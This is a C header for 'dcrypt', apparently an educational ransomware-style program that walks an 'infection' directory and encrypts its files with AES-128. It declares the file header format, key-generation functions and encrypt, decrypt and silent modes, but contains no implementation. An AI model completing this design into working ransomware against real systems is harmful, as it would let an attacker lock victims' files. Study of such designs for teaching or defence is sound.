#ifndef DCRYPT_H
# define DCRYPT_H

# include <stdio.h>
# include <stdlib.h>
# include <fcntl.h>
# include <stdint.h>
# include <string.h>
# include <time.h>          // For rand & srand (encryption key generation)
# include <dirent.h>        // For looping through directory
# include <stdbool.h>
# include <sys/stat.h>      // For checking if directory
# include <getopt.h>        // For argv parsing

# include "ascii_format.h"

/*------------------------ Cross-platform --------------------------*/

# ifdef _WIN32
# include <windows.h>

# define DC_TARGET_PATHS        { "D:\\Documents\\infection" } // No '\' at the end
# define DC_PATH_SEP            '\\' // Paths separator 

// Hold the data needed for unmaping the file data
typedef struct s_windows
{
    HANDLE*         hFile;
    HANDLE*         hMap;
    HCRYPTPROV      hProv;
    HCRYPTKEY       hKey;
    // unsigned char   *encryption_key;
}   t_windows;

extern t_windows win_env;

# else

# include <unistd.h>
# define DC_TARGET_PATHS        { "/home/alien/infection" } // No '/' at the end
# define DC_PATH_SEP            '/' // Paths separator 

#endif

/*------------------------ Defines, enum, struct --------------------------*/

// About the program
# define DC_PROG_VERSION        "2.1.0"
# define DC_PROG_AUTHOR         "d."
# define DC_PROG_NAME           "dcrypt"

// Paths of the target directories
# define DC_TARGET_ARRAY_SIZE   1

// Unhandled paths
# define DC_UNHANDLED_DIRS_ARRAY_SIZE   2
# define DC_UNHANDLED_DIRS      { ".", ".." }

// Returns
enum e_returns
{
    DC_SUCCESS,
    DC_ERROR
};

# define DC_CRYPT_ERROR			-1

// Maximum amount of handled files on a directory
# define DC_MAX_FILES           1024

// Charset used for the encryption key
# define DC_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
                                "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                                "0123456789"

// Signature injected in the target files's dcrypt header
# define DC_SIGNATURE           "2DCRYPT!"
# define DC_DCRYPT_EXT          "dcrypt"
# define DC_DCRYPT_EXT_SIZE     7
# define DC_AES_KEY_SIZE        16
# define DC_AES_HEX_KEY_SIZE    32 // Key size of string formatted hex key (16 x 2)
# define DC_AES_BLOCK_SIZE      16

enum e_modes
{
    // Display detailed notifications
    DC_VERBOSE                  = 1,
    DC_ENCRYPT                  = 2,
    DC_REVERSE                  = 4
};

enum e_dcrypt_header
{
    DC_DCRYPT_HEADER_SIZE       = 0x0026,
    DC_MAGICNBR_SIZE            = 8,
    DC_IV_SIZE                  = 16,
};

/*
 * This is the dcrypt header that is written before the original header.
 * It has a size of 0x0026 (= 38) bytes.
 */

typedef struct s_dcrypt_header
{
    // 0x0000 Magic value/signature to identify encrypted files.
    uint8_t     signature[DC_MAGICNBR_SIZE];

    /*
     * 0x0008 AES-128 encryption's Initialization Vector (IV).
     * A 16 bytes key is stored here in plaintext.
     */

    uint8_t     iv_key[DC_IV_SIZE];

    // 0x0018 Original file size
    uint64_t    original_filesize;

    // 0x0026 Encrypted file contents (AES-128 CBC)
}               t_dcrypt_header;

typedef struct s_env
{
    unsigned char       *mapped_data;       // File is mapped in memory here
    unsigned char       *encrypted_data;    // Encrypted mapped data
    uint16_t            modes;              // Options given from command line
    t_dcrypt_header     dcrypt_header;
    int                 encrypted_filesize; // File size without the header 
    unsigned char       *encryption_key;
    unsigned char       *decryption_key;
    size_t              handled_file_count;
}   t_env;

/*---------------------------- Function prototypes ------------------------*/

void    parse_argv(t_env *env, int argc, char *argv[]);
void    detect_silent_mode(t_env *env, int argc, char *argv[]);

char    *get_filename(char *argv[]);
int     map_file_into_memory(t_env *env, const char *filename);
int     process_mapped_data(t_env *env);
int     write_processed_data_to_file(t_env *env, const char *target_path);

/*------------------------------- Utils ---------------------------*/

void    hexstr_to_bytes(const unsigned char *hexstr, unsigned char *out, size_t out_len);
void    print_hex(const char *label, const unsigned char *data, size_t data_len);
void    *dc_free(void **ptr);
void    exit_gracefully(t_env *env);

/*---------------------------- Cryptography ------------------------*/

void            xor_with_additive_cipher(
    void *key, size_t key_length, void *data, size_t data_length, int mode);

# ifdef _WIN32
int             aes_encrypt_data(t_env *env, unsigned char *data, unsigned char **encrypted_data,
    DWORD data_len, HCRYPTKEY key, unsigned char *iv);
int             aes_decrypt_data(t_env *env, unsigned char *data, DWORD data_len, \
    HCRYPTKEY key, unsigned char *iv);
HCRYPTKEY       generate_encryption_key(t_env *env);
HCRYPTKEY       import_raw_aes_key(t_env *env, const unsigned char *key, DWORD key_len);
# else
int             aes_encrypt_data(t_env *env, unsigned char *data, unsigned char **encrypted_data,
    size_t data_len, const unsigned char *key, unsigned char *iv);
int             aes_decrypt_data(t_env *env, unsigned char *data, size_t data_len, \
    const unsigned char *key, unsigned char *iv);
unsigned char   *generate_random_based_key(t_env *env, const char *_charset, \
    size_t strength, bool blocking);
# endif

unsigned char    *generate_time_based_rand_key_nanosec(const char *_charset, \
    size_t strength);
unsigned char    *get_key(t_env *env);

/*---------------------------- File handling ------------------------*/

bool    is_extension_handled(t_env *env, char *filepath);
void    handle_dir(t_env *env, char *target_dir_path);

#endif
